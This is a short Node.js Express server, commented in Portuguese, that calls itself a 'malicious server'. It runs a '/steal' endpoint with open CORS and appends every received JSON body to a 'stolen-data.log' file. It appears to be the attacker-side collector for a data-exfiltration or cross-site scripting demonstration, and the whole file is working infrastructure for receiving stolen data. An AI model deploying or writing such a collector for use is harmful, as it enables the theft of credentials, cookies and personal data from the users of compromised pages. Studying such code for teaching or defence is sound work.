const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const cors = require("cors");

const app = express();
const PORT = 8080;

app.use(cors());
app.use(bodyParser.json());

app.post("/steal", (req, res) => {
    const stolenData = req.body;

    // Salvar os dados em um arquivo
    fs.appendFile("stolen-data.log", JSON.stringify(stolenData) + "\n", (err) => {
        if (err) {
            console.error("Erro ao salvar dados:", err);
        } else {
            console.log("Dados roubados salvos com sucesso:", stolenData);
        }
    });

    // Responder ao script
    res.status(200).json({ message: "Dados recebidos pelo servidor malicioso" });
});

// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor malicioso rodando em http://localhost:${PORT}`);
});